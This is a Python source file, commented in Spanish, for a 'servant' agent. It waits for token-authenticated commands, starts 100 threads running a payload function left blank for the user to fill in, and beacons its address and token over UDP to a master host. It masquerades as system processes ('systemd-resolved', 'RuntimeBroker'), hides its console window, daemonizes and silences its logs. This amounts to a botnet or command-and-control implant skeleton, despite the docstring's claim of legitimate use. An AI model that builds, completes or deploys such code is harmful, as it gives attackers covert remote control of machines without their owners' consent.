#!/usr/bin/env python3
"""
Servant server (escucha en localhost). Cuando recibe un comando autenticado
lanza 100 hilos que llaman a `bodrio(index)`.

IMPORTANTE: Este servicio está diseñado para uso local y legítimo en entornos
autorizados (simulaciones de seguridad, administración remota institucional).
"""

import argparse
import json
import logging
import socketserver
import threading
import sys
import os
import platform
from typing import Tuple
import socket
import time
import signal
import atexit

# Logging se configurará según modo (silent o no)
logger = logging.getLogger(__name__)

IS_WINDOWS = platform.system() == 'Windows'
IS_LINUX = platform.system() == 'Linux'

DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 65432
DEFAULT_TOKEN = "changeme-token"
DEFAULT_MASTER_HOST = None
DEFAULT_MASTER_PORT = None
DEFAULT_PROCESS_NAME = "systemd-resolved" if IS_LINUX else "RuntimeBroker"  # Nombres de proceso legítimos por OS


def hide_console_window():
    """Oculta la ventana de consola en Windows."""
    if not IS_WINDOWS:
        return
    
    try:
        import ctypes
        # Obtener handle de la ventana de consola
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            # SW_HIDE = 0
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception:
        pass


def set_process_name(name: str) -> None:
    """Intenta cambiar el nombre del proceso para que sea menos obvio en ps/top/taskmgr."""
    try:
        # Intenta con setproctitle si está disponible
        import setproctitle
        setproctitle.setproctitle(name)
    except ImportError:
        # Fallback: modifica sys.argv[0] (solo visible parcialmente)
        if sys.argv:
            sys.argv[0] = name
    except Exception:
        pass
    
    # En Windows, también intentar con ctypes
    if IS_WINDOWS:
        try:
            import ctypes
            # Cambiar el título de la ventana (si hay)
            ctypes.windll.kernel32.SetConsoleTitleW(name)
        except Exception:
            pass


def daemonize(pidfile: str = None, workdir: str = '/') -> None:
    """Fork del proceso para convertirlo en daemon (background sin terminal).
    
    Solo funciona en Linux/Unix. En Windows se usa hide_console_window() en su lugar.
    Basado en el patrón Unix daemon estándar (doble fork).
    """
    if IS_WINDOWS:
        logger.warning("daemonize() no soportado en Windows. Usa --hide-window en su lugar.")
        return
    
    # Primer fork
    try:
        pid = os.fork()
        if pid > 0:
            # Padre: termina
            sys.exit(0)
    except OSError as e:
        sys.stderr.write(f"fork #1 failed: {e}\n")
        sys.exit(1)
    
    # Desacoplar del entorno del padre
    os.chdir(workdir)
    os.setsid()
    os.umask(0)
    
    # Segundo fork
    try:
        pid = os.fork()
        if pid > 0:
            # Padre intermedio: termina
            sys.exit(0)
    except OSError as e:
        sys.stderr.write(f"fork #2 failed: {e}\n")
        sys.exit(1)
    
    # Hijo daemon: redirigir stdin/stdout/stderr
    sys.stdout.flush()
    sys.stderr.flush()
    
    # Redirigir a /dev/null
    with open('/dev/null', 'r') as devnull_r:
        os.dup2(devnull_r.fileno(), sys.stdin.fileno())
    with open('/dev/null', 'a+') as devnull_w:
        os.dup2(devnull_w.fileno(), sys.stdout.fileno())
        os.dup2(devnull_w.fileno(), sys.stderr.fileno())
    
    # Escribir PID file si se especificó
    if pidfile:
        pid = str(os.getpid())
        with open(pidfile, 'w+') as f:
            f.write(f"{pid}\n")
        
        # Limpiar pidfile al salir
        atexit.register(lambda: os.remove(pidfile) if os.path.exists(pidfile) else None)


def setup_logging(silent: bool = False, logfile: str = None) -> None:
    """Configura logging según el modo de ejecución."""
    if silent:
        # Modo silencioso: solo errores críticos a archivo o nul
        null_device = 'nul' if IS_WINDOWS else '/dev/null'
        logging.basicConfig(
            level=logging.CRITICAL,
            format="%(asctime)s [%(levelname)s] %(message)s",
            filename=logfile or null_device
        )
    else:
        # Modo normal: logging a stdout o archivo
        if logfile:
            logging.basicConfig(
                level=logging.INFO,
                format="%(asctime)s [%(levelname)s] %(message)s",
                filename=logfile
            )
        else:
            logging.basicConfig(
                level=logging.INFO,
                format="%(asctime)s [%(levelname)s] %(message)s"
            )
    
    global logger
    logger = logging.getLogger(__name__)


def bodrio(index: int) -> None:
    """Usuario debe implementar esta función.
    Será llamada desde 100 hilos con un argumento `index` (0..99).
    Deja el cuerpo vacío o con `pass` — tú lo implementarás.
    """
    # Implementa aquí la lógica que quieras. Mantén la firma (index: int) -> None
    pass


class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
    def handle(self) -> None:
        try:
            data = self.request.recv(4096).strip()
            if not data:
                return
            try:
                payload = json.loads(data.decode('utf-8'))
            except Exception:
                logger.warning("Received non-JSON payload from %s", self.client_address)
                return

            token = payload.get('token')
            action = payload.get('action')

            if token != self.server.expected_token:
                logger.warning("Authentication failed from %s", self.client_address)
                return

            if action == 'run':
                count = int(payload.get('count', 100))
                logger.info("Authenticated run command received; spawning %d threads", count)
                spawn_bodrio_threads(count)
                self.request.sendall(b'{"status":"ok","msg":"spawned"}')
            else:
                logger.info("Unknown action '%s' from %s", action, self.client_address)
                self.request.sendall(b'{"status":"error","msg":"unknown action"}')
        except Exception as e:
            logger.exception("Error handling request: %s", e)


class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True


def spawn_bodrio_threads(count: int = 100) -> None:
    def _wrapper(idx: int):
        try:
            bodrio(idx)
        except Exception:
            logger.exception("Error in bodrio thread %d", idx)

    threads = []
    for i in range(count):
        t = threading.Thread(target=_wrapper, args=(i,), daemon=True)
        t.start()
        threads.append(t)
    logger.info("Spawned %d bodrio threads", len(threads))


def run_server(host: str, port: int, token: str) -> None:
    with ThreadedTCPServer((host, port), ThreadedTCPRequestHandler) as server:
        server.expected_token = token
        logger.info("Servant listening on %s:%d (token=%s)", host, port, token)
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            logger.info("Shutting down server")
            server.shutdown()


def announce_master_loop(master_host: str, master_port: int, my_host: str, my_port: int, token: str, interval: int = 30) -> None:
    """Periodically announce this servant to the master (UDP).

    Sends a small JSON payload with host, port and token. The master can
    use this to maintain a registry of active servants.
    """
    if not master_host or not master_port:
        return

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = {
        'host': my_host,
        'port': my_port,
        'token': token,
        'ts': None,
    }

    while True:
        try:
            payload['ts'] = int(time.time())
            data = json.dumps(payload).encode('utf-8')
            sock.sendto(data, (master_host, master_port))
        except Exception:
            logger.exception("Failed to announce to master %s:%s", master_host, master_port)
        time.sleep(interval)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Servant server (local).")
    parser.add_argument('--host', default=DEFAULT_HOST, help='Host to bind (default: 127.0.0.1)')
    parser.add_argument('--port', default=DEFAULT_PORT, type=int, help='Port to bind (default: 65432)')
    parser.add_argument('--token', default=DEFAULT_TOKEN, help='Pre-shared token for simple auth')
    parser.add_argument('--master-host', default=DEFAULT_MASTER_HOST, help='Master host to announce to (optional)')
    parser.add_argument('--master-port', default=DEFAULT_MASTER_PORT, type=int, help='Master port to announce to (optional)')
    
    # Opciones de ejecución silenciosa/daemon
    parser.add_argument('--daemon', action='store_true', help='Run as background daemon (Linux/Unix only)')
    parser.add_argument('--hide-window', action='store_true', help='Hide console window (Windows only)')
    parser.add_argument('--silent', action='store_true', help='Minimize logging output')
    parser.add_argument('--logfile', default=None, help='Log file path (default: stdout or nul/dev/null if silent)')
    parser.add_argument('--pidfile', default=None, help='PID file path for daemon mode')
    parser.add_argument('--process-name', default=DEFAULT_PROCESS_NAME, help='Process name to show in ps/top/taskmgr')
    
    return parser.parse_args()


def main():
    args = parse_args()
    
    # Configurar logging antes de daemonizar
    setup_logging(silent=args.silent, logfile=args.logfile)
    
    # Windows: ocultar ventana de consola si se solicitó
    if args.hide_window and IS_WINDOWS:
        logger.info("Hiding console window...")
        hide_console_window()
    
    # Cambiar nombre del proceso
    if args.process_name:
        set_process_name(args.process_name)
    
    # Linux: Daemonizar si se solicitó
    if args.daemon:
        if IS_LINUX:
            logger.info("Daemonizing process...")
            daemonize(pidfile=args.pidfile)
            # Re-setup logging después de daemonizar (los file descriptors cambian)
            setup_logging(silent=args.silent, logfile=args.logfile)
        else:
            logger.warning("--daemon not supported on Windows. Use --hide-window instead.")

    # Windows: escribir PID file si se especificó
    if args.pidfile and IS_WINDOWS:
        with open(args.pidfile, 'w') as f:
            f.write(f"{os.getpid()}\n")
        atexit.register(lambda: os.remove(args.pidfile) if os.path.exists(args.pidfile) else None)

    # If master announce is configured, start announcer thread
    if args.master_host and args.master_port:
        t = threading.Thread(target=announce_master_loop, args=(args.master_host, args.master_port, args.host, args.port, args.token), daemon=True)
        t.start()

    run_server(args.host, args.port, args.token)


if __name__ == '__main__':
    main()
